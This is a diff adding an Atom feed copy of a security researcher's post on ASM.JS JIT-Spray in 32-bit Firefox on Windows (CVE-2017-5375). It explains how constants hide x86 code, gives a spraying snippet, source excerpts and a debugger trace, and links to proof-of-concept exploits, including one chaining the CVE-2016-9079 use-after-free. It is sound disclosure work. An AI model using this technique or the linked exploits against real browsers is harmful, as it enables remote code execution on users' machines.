@@ -1,0 +1,331 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: advisory | &#x03C1;]]></title>
+  <link href="https://rh0dev.github.io//blog/categories/advisory/atom.xml" rel="self"/>
+  <link href="https://rh0dev.github.io//"/>
+  <updated>2017-07-14T01:03:25+02:00</updated>
+  <id>https://rh0dev.github.io//</id>
+  <author>
+    <name><![CDATA[Rh0]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[The Return of The JIT (Part 1)]]></title>
+    <link href="https://rh0dev.github.io//blog/2017/the-return-of-the-jit/"/>
+    <updated>2017-07-13T17:54:28+02:00</updated>
+    <id>https://rh0dev.github.io//blog/2017/the-return-of-the-jit</id>
+    <content type="html"><![CDATA[<p></p>
+
+<p>TL;DR: This is the story about <em>ASM.JS</em> JIT-Spray in Mozilla Firefox (x86) on Windows tracked as
+<a href="https://www.mozilla.org/en-US/security/advisories/mfsa2017-01/#CVE-2017-5375">CVE-2017-5375</a> and <a href=https://www.mozilla.org/en-US/security/advisories/mfsa2017-05/#CVE-2017-5400>CVE-2017-5400</a>. It allows to fully bypass DEP and ASLR.</p>
+
+<p>I always liked the idea of JIT-Spray since the first time I saw it being used for
+<a
+href="https://dl.packetstormsecurity.net/papers/shellcode/Writing-JIT-Spray-Shellcode.pdf">Flash</a>
+in 2010. Just to name a few, JIT-Spray has been used to exploit bugs in <a
+href="https://www.exploit-db.com/exploits/14221">Apple Safari</a>, create <a
+href="http://zhodiac.hispahack.com/my-stuff/security/Flash_Jit_InfoLeak_Gadgets.pdf">info leak gadgets in Flash</a>, attack various <a
+href=https://www.nccgroup.trust/globalassets/resources/us/presentations/documents/attacking_clientside_jit_compilers_paper.pdf>other client software</a>,
+and has even been abusing <a href=https://sites.google.com/site/bingsunsec/WARPJIT/JIT%20Spraying%20Never%20Dies%20-%20Bypass%20CFG%20By%20Leveraging%20WARP%20Shader%20JIT%20Spraying.pdf>Microsoft&rsquo;s WARP Shader JIT Engine</a></p>
+
+<!-- more -->
+
+
+<p>@asintsov wrote in 2010:</p>
+
+<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">No JIT-SPRAY in Flash 10.1. Pages with  code are crypted )) But idea will never die, that i show on HITB in AMS)</p>&mdash; Alyosha Sintsov (@asintsov) <a href="https://twitter.com/asintsov/status/15947640318">June 11, 2010</a></blockquote>
+
+
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+<p>Yes, the idea will never die, and from time to time JIT-Spray reappears&hellip;</p>
+
+<p><br></p>
+
+<h2>JIT-Spray</h2>
+
+<p></p>
+
+<p>It greatly simplifies exploiting a memory corruption bug such as an
+use-after-free, because the attacker only needs to hijack the intruction pointer
+and jump to JIT-Sprayed shellcode. There is no need disclose code locations or
+base addresses of DLLs and there is no need for any code-reuse.</p>
+
+<p>JIT-Spray is usually possible when:</p>
+
+<ol>
+<li>Machine code can be hidden within constants of a high-level language such as JavaScript: This bypasses DEP.</li>
+<li>The attacker is able to force the JIT compiler to emit the constants into many execuable code regions whose addresses are predictable: This bypasses ASLR.</li>
+</ol>
+
+
+<p>For example to achieve (1), we can inject NOPS (0x90) in ASM.JS
+code with:</p>
+
+<pre><code class="javascript Injecting NOPS with ASM.JS constants">VAL = (VAL + 0xA8909090)|0;
+VAL = (VAL + 0xA8909090)|0;
+</code></pre>
+
+<p>Firefox&#8217; ASM.JS compiler generates the following x86 machine code:</p>
+
+<pre><code class="plain Native x86 code generated from ASM.JS">00: 05909090A8    ADD EAX, 0xA8909090
+05: 05909090A8    ADD EAX, 0xA8909090
+</code></pre>
+
+<p>When we jump into to offset 01 (the middle of the first instruction) we can
+execute our hidden code:</p>
+
+<pre><code class="plain Hidden instructions within emitted x86 code">01: 90    NOP
+02: 90    NOP
+03: 90    NOP
+04: A805  TEST AL, 05
+06: 90    NOP
+07: 90    NOP
+08: 90    NOP
+09: A8...
+</code></pre>
+
+<p>Thus, in our four-byte constants, we have three bytes to hide our code and
+one byte (0xA8) to wrap the <strong>ADD EAX, &hellip;</strong> instruction into the NOP-like
+instruction <strong>TEST AL, 05</strong>.
+</p>
+
+<p>To achieve condition (2), i.e., to create many executable regions
+containing our code we request the ASM.JS module many times:</p>
+
+<pre><code class="JavaScript ASM.JS JIT-Sprayer">function asm_js_module(){
+    "use asm"
+    function asm_js_function(){
+        /* attacker controlled asm.js code */
+    }
+    return asm_js_function
+}
+modules = []
+/* create 0x1000 executable regions containing our code */
+for (i=0; i&lt;=0x1000; i++){
+    modules[i] = asm_js_module() // request asm.js module
+}
+</code></pre>
+
+<p>Technically, ASM.JS is an <em>ahead-of-time (AOT)</em> compiler and not a <em>just-in-time (JIT)</em> compiler.
+Hence, the function <span class="inlineCode">asm_js_function()</span> doesn&rsquo;t need to be called to get your
+machine code injected into memory at predictable addresses. It is sufficient to load a web page containing the ASM.JS script.</p>
+
+<p><br></p>
+
+<h2>The Flaw</h2>
+
+<p><a name="the_bug"></a>
+Each time an ASM.JS module is requested, <span class="inlineCode">CodeSegment::create()</span> is called
+which in turn calls <span class="inlineCode">AllocateCodeSegment()</span> in
+<em>firefox-50.1.0/js/src/asmjs/WasmCode.cpp</em> line #206 (based on the source of
+<a href=https://ftp.mozilla.org/pub/firefox/releases/50.1.0/source/firefox-50.1.0.source.tar.xz>Firefox 50.1.0</a>):</p>
+
+<pre><code class="C firefox-50.1.0/js/src/asmjs/WasmCode.cpp (CodeSegment::create)">191 /* static */ UniqueCodeSegment
+192 CodeSegment::create(JSContext* cx,
+193                     const Bytes&amp; bytecode,
+194                     const LinkData&amp; linkData,
+195                     const Metadata&amp; metadata,
+196                     HandleWasmMemoryObject memory)
+197 {                                                                                                                                                                                
+198     MOZ_ASSERT(bytecode.length() % gc::SystemPageSize() == 0);
+199     MOZ_ASSERT(linkData.globalDataLength % gc::SystemPageSize() == 0);
+200     MOZ_ASSERT(linkData.functionCodeLength &lt; bytecode.length());
+201
+202     auto cs = cx-&gt;make_unique&lt;CodeSegment&gt;();
+203     if (!cs)
+204         return nullptr;
+205
+206     cs-&gt;bytes_ = AllocateCodeSegment(cx, bytecode.length() + linkData.globalDataLength);
+</code></pre>
+
+<p><span class="inlineCode">AllocateCodeSegment()</span> further calls <span class="inlineCode">AllocateExecutableMemory()</span> in line #67:</p>
+
+<pre><code class="C firefox-50.1.0/js/src/asmjs/WasmCode.cpp (AllocateCodeSegment)">58 AllocateCodeSegment(ExclusiveContext* cx, uint32_t totalLength)
+59 {
+60     if (wasmCodeAllocations &gt;= MaxWasmCodeAllocations)
+61         return nullptr;
+62
+63     // Allocate RW memory. DynamicallyLinkModule will reprotect the code as RX.
+64     unsigned permissions =
+65         ExecutableAllocator::initialProtectionFlags(ExecutableAllocator::Writable);
+66
+67     void* p = AllocateExecutableMemory(nullptr, totalLength, permissions,
+68                                        "wasm-code-segment", gc::SystemPageSize());
+</code></pre>
+
+<p>Finally, <span class="inlineCode">AllocateExecutableMemory()</span> invokes <span class="inlineCode">VirtualAlloc()</span> which returns a
+new RW (PAGE_READWRITE) region aligned to a 64KB boundary (<strong>0xXXXX0000</strong>) (<em>firefox-50.1.0/js/src/jit/ExecutableAllocatorWin.cpp</em>, line #190).</p>
+
+<pre><code class="C firefox-50.1.0/js/src/jit/ExecutableAllocatorWin.cpp (AllocateExecutableMemory)">179 void*
+180 js::jit::AllocateExecutableMemory(void* addr, size_t bytes, unsigned permissions, const char* tag,
+181                                   size_t pageSize)
+182 {
+183     MOZ_ASSERT(bytes % pageSize == 0);
+184
+185 #ifdef JS_CPU_X64
+186     if (sJitExceptionHandler)
+187         bytes += pageSize;
+188 #endif
+189
+190     void* p = VirtualAlloc(addr, bytes, MEM_COMMIT | MEM_RESERVE, permissions);
+</code></pre>
+
+<p>If we set a breakpoint on <span class="inlineCode">VirtualAlloc()</span> in WinDbg, we get the following call stack during runtime (Firefox 50.1.0):</p>
+
+<pre><code class="plain Stack trace in WinDbg">0:000&gt; kP a
+ # ChildEBP RetAddr  
+00 008fe060 670ef66e KERNEL32!VirtualAllocStub
+01 (Inline) -------- xul!js::jit::AllocateExecutableMemory+0x10 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\jit\executableallocatorwin.cpp @ 190]
+02 008fe078 670f65c7 xul!AllocateCodeSegment(
+            class js::ExclusiveContext * cx = 0x04516000, 
+            unsigned int totalLength = &lt;Value unavailable error&gt;)+0x23 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\asmjs\wasmcode.cpp @ 67]
+03 008fe0b8 670de070 xul!js::wasm::CodeSegment::create(
+            struct JSContext * cx = 0x04516000, 
+            class mozilla::Vector&lt;unsigned char,0,js::SystemAllocPolicy&gt; * bytecode = 0x08c61008, 
+            struct js::wasm::LinkData * linkData = 0x08c61020, 
+            struct js::wasm::Metadata * metadata = 0x06ab68d0, 
+            class JS::Handle&lt;js::WasmMemoryObject *&gt; memory = class JS::Handle&lt;js::WasmMemoryObject *&gt;)+0x67 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\asmjs\wasmcode.cpp @ 206]
+04 008fe184 6705f99d xul!js::wasm::Module::instantiate(
+            struct JSContext * cx = 0x04516000, 
+            class JS::Handle&lt;JS::GCVector&lt;JSFunction *,0,js::TempAllocPolicy&gt; &gt; funcImports = class JS::Handle&lt;JS::GCVector&lt;JSFunction *,0,js::TempAllocPolicy&gt; &gt;, 
+            class JS::Handle&lt;js::WasmTableObject *&gt; tableImport = class JS::Handle&lt;js::WasmTableObject *&gt;, 
+            class JS::Handle&lt;js::WasmMemoryObject *&gt; memoryImport = class JS::Handle&lt;js::WasmMemoryObject *&gt;, 
+            class mozilla::Vector&lt;js::wasm::Val,0,js::SystemAllocPolicy&gt; * globalImports = 0x008fe200, 
+            class JS::Handle&lt;JSObject *&gt; instanceProto = class JS::Handle&lt;JSObject *&gt;, 
+            class JS::MutableHandle&lt;js::WasmInstanceObject *&gt; instanceObj = class JS::MutableHandle&lt;js::WasmInstanceObject *&gt;)+0x94 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\asmjs\wasmmodule.cpp @ 689]
+05 008fe260 6705aae6 xul!TryInstantiate(
+            struct JSContext * cx = 0x04516000, 
+            class JS::CallArgs args = class JS::CallArgs, 
+            class js::wasm::Module * module = 0x08c61000, 
+            struct js::AsmJSMetadata * metadata = 0x06ab68d0, 
+            class JS::MutableHandle&lt;js::WasmInstanceObject *&gt; instanceObj = class JS::MutableHandle&lt;js::WasmInstanceObject *&gt;, 
+            class JS::MutableHandle&lt;JSObject *&gt; exportObj = class JS::MutableHandle&lt;JSObject *&gt;)+0x1e6 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\asmjs\asmjs.cpp @ 7894]
+06 008fe2c4 35713638 xul!InstantiateAsmJS(
+            struct JSContext * cx = 0x04516000, 
+            unsigned int argc = 0, 
+            class JS::Value * vp = 0x008fe2f0)+0x88 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\js\src\asmjs\asmjs.cpp @ 8008]
+</code></pre>
+
+<p>After returning into method <span class="inlineCode">CodeSegment::create()</span>, the ASM.JS compiled/native code is copied to the RW region
+(<em>firefox-50.1.0/js/src/asmjs/WasmCode.cpp</em>, line #223). And in line #229 the RW region is made executable (PAGE_EXECUTE_READ) with
+<span class="inlineCode">ExecutableAllocator::makeExecutable()</span> invoking <span class="inlineCode">VirtualProtect()</span>.</p>
+
+<pre><code class="C firefox-50.1.0/js/src/asmjs/WasmCode.cpp making ASM.JS code executable (in CodeSegment::create)">223         memcpy(cs-&gt;code(), bytecode.begin(), bytecode.length());
+224         StaticallyLink(*cs, linkData, cx);
+225         if (memory)
+226             SpecializeToMemory(*cs, metadata, memory);
+227     }
+228 
+229     if (!ExecutableAllocator::makeExecutable(cs-&gt;code(), cs-&gt;codeLength())) {
+</code></pre>
+
+<p><br>
+Requesting one ASM.JS module many times leads to the creation of many RX regions.
+Due to the allocation granularity of VirtualAlloc (64KB) we can then choose a
+fixed address (such as <strong>0x1c1c0000</strong>) and can be certain that the
+emitted machine code is located there (containing our hidden payload).</p>
+
+<p>The astute reader might have noticed that constant blinding is missing
+and allows to emit ASM.JS constants as x86 code in the first place.</p>
+
+<p><br></p>
+
+<h2>Show me a PoC!</h2>
+
+<p>Let&rsquo;s see how a <a
+href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0.html"
+target="_blank">proof of concept</a> looks in practice: we hide our payload
+within ASM.JS constants and request the ASM.JS module many times. Hence, we
+spray many executable code regions to occupy predictable addresses.</p>
+
+<p>The payload consists of two parts:</p>
+
+<ol>
+<li>Very large NOP-sled (line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0.html#L35" target="_blank">#35 to #74</a>):
+to hit it, we can choose a predictable address, such as <strong>0x1c1c0053</strong>, and set EIP to it.</li>
+<li>Shellcode (line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0.html#L75" target="_blank">#75 to #152</a>):
+it resolves <span class="inlineCode">kernel32!WinExec()</span>and executes <em>cmd.exe</em>.</li>
+</ol>
+
+
+<p>The payload strictly contains at most three-byte long instructions excepts
+<strong>MOV</strong>s, which are handled differently. It was automatically generated by a
+custom transformation tool <em>shellcode2asmjs</em> which uses the <em>Nasm</em> assembler and <em>Distorm3</em>
+disassembler. The payload is strongly inspired by <a
+href="https://dl.packetstormsecurity.net/papers/shellcode/Writing-JIT-Spray-Shellcode.pdf" target="_blank">Writing JIT-Spray-Shellcode</a>.</p>
+
+<p>As no memory corruption is abused in this PoC, you have to set EIP in your
+favorite debugger when you are prompted to ;)</p>
+
+<p><br></p>
+
+<h2>Exploiting a former Tor-Browser 0day with ASM.JS JIT-Spray</h2>
+
+<p>Let&rsquo;s take a real memory corruption (<a
+href="https://www.mozilla.org/en-US/security/advisories/mfsa2016-92/" target="_blank">CVE-2016-9079</a>) and
+see how super easy exploitation becomes when using ASM.JS JIT-Spray. This
+use-after-free has been analyzed thoroughly, so most of the hard work to write a
+custom exploit was already done. We target Firefox <strong>50.0.1</strong> and <em>not</em> <strong>50.1.0</strong> as above.</p>
+
+<p>Despite JIT-Spraying executable regions, following steps are conducted:</p>
+
+<ul>
+<li>We use the bug-trigger from the <a
+href="https://bugzilla.mozilla.org/show_bug.cgi?id=1321066" target="_blank">bug report</a>
+(line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/CVE-2016-9079_Firefox_50.0.1_DEP_ASLR_Bypass.html#L296" target="_blank">#296 to #372</a>).</li>
+<li>We heap-spray a fake object (line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/CVE-2016-9079_Firefox_50.0.1_DEP_ASLR_Bypass.html#L258" target="_blank">#258 to #281</a>).</li>
+<li>During runtime, the chosen values in our fake object drive the execution to a program path with an indirect call.
+There, EIP is set with the address of one JIT-Sprayed region (<strong>0x1c1c0054</strong>).</li>
+<li>As soon as the bug is triggered, the JIT-sprayed payload is executed and
+cmd.exe should pop up.</li>
+</ul>
+
+
+<p>That&rsquo;s all. The full <a
+href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/CVE-2016-9079_Firefox_50.0.1_DEP_ASLR_Bypass.html">exploit</a>
+targets Mozilla Firefox 50.1.0, and we don&rsquo;t need any information-leaks and
+code-reuse. Note that the Tor-Browser has ASM.JS disabled by default, and hence,
+ASM.JS JIT-Spray won&rsquo;t work unless the user enables it.</p>
+
+<p>I wonder if Endgames <a href=https://www.endgame.com/blog/technical-blog/another-0day-another-prevention>HA-CFI</a> catches this exploit?</p>
+
+<p><br></p>
+
+<h2>Dynamic Payloads</h2>
+
+<p>Above exploits contain &ldquo;hardcoded&rdquo; payloads within constants. That makes it kind
+of cumbersome to use different shellcodes. However, we can generate ASM.JS scripts
+on the fly and invoke them during runtime. A <a
+href="CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0_dynamic.html">PoC</a>
+where payloads are exchangeable uses the following:</p>
+
+<ul>
+<li>JavaScript code creates ASM.JS script-code dynamically. The ASM.JS script is
+included with the Blob JavaScript API (line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0_dynamic.html#L88" target="_blank">#88 to #137</a>).</li>
+<li>A custom VirtualAlloc stage0. It allocates RWX pages and copies the actual
+stage1 payload (i.e. metasploit shellcode) to it. Afterwards, stage0
+jumps to stage1 (line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0_dynamic.html#L53" target="_blank">#53 to #69</a>).</li>
+</ul>
+
+
+<p>This way, you can replace the payload with your favorite shellcode of choice
+(line <a href="https://github.com/rh0dev/expdev/blob/master/CVE-2017-5375_ASM.JS_JIT-Spray/WinExec_cmd_Firefox_50.1.0_dynamic.html#L29" target="_blank">#29</a>).
+The PoC and especially the stage0 payload were also auto-generated with the custom
+<em>shellcode2asmjs</em> tool.</p>
+
+<p><br></p>
+
+<h2>The Incomplete Fix</h2>
+
+<p>Mozilla fixed this issue in <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2017-01/">Firefox 51</a> on Jan. 24, 2017. However, the fix can be bypassed which resulted in
+<a href="https://www.mozilla.org/en-US/security/advisories/mfsa2017-05/#CVE-2017-5400">CVE-2017-5400</a>. This will be explained in part 2.</p>
+]]></content>
+  </entry>
+  
+</feed>
